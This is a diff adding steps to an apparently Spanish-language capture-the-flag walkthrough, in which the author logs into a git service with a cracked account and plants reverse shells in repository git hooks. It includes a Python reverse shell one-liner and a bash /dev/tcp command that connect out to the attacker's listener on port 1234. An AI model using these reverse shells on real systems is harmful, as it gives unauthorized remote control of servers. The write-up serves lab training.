@@ -318,5 +318,50 @@ IMPORTANTE: SI HEMOS CAMBIADO EL HASH TENEMOS QUE PONER EL TIPO DE HASH QUE HEMO
 
 ![image](https://github.com/user-attachments/assets/18f8e57c-e52c-4f1b-a60a-4d3191917871)
 
+Navegamos a la url que hemos descifrado antes del CAT al archivo app.ini.bak
+
+![image](https://github.com/user-attachments/assets/a24f7852-d927-4a14-8299-c883f17a4ca7)
+
+Nos logeamos con la cuenta anteriormente vulnerada:
+
+![image](https://github.com/user-attachments/assets/6f35dd93-10dd-4640-81bd-32307f78c00a)
+
+RECUERDA SIEMPRE NO PONER EL HASH Y PONER LA CONTRASEÑA DESENCRIPTADA
+
+Entramos a los githooks de los archivos 
+
+![image](https://github.com/user-attachments/assets/4cc92f12-18d1-48f1-9fce-4e5f6832f241)
+
+Vamos a poner lo siguiente, esto lo podrás sacar de pentestmonkey:
+
+```bash
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+```
+
+![image](https://github.com/user-attachments/assets/a576fec2-46d8-4d35-95f6-6e7fe1c0ed80)
+
+Lo editaremos a nuestro gusto, cambiaremos la ip a la de nuestra máquina y nos pondremos en escucha por el puerto 1234 con netcap:
+
+![image](https://github.com/user-attachments/assets/f148c2cd-61d4-4a49-9157-f03ce23b12de)
+
+Para que se actualice la página y se ejecute el codigo de python, vamos a cambiar algo de los directorios, vamos a cambiar el README ya que no vamos a interferir negativamente a la página.
+
+![image](https://github.com/user-attachments/assets/b7f6fbda-c343-4df9-a92b-34da19223916)
+
+Hemos añadido una linea para no interferir en nada, una vez hecho esto le hemos dado a update
+
+Aqui tenemos la shell y nos dirigimos al directorio raiz y vamos a /home/frank
+
+![image](https://github.com/user-attachments/assets/8b2d7dc1-1449-464d-b4bb-e0429dca5d53)
+
+Vamos a probar con este código:
+
+![image](https://github.com/user-attachments/assets/28f1fa37-7992-429d-9514-0f90ce9ac4c1)
+
+```bash
+/bin/bash -i >& /dev/tcp/10.0.2.15/1234 0>&1
+```
+
+Le damos a update y actualizamos como antes igual y teniendo el netcap abierto por el puerto 1234
 
 
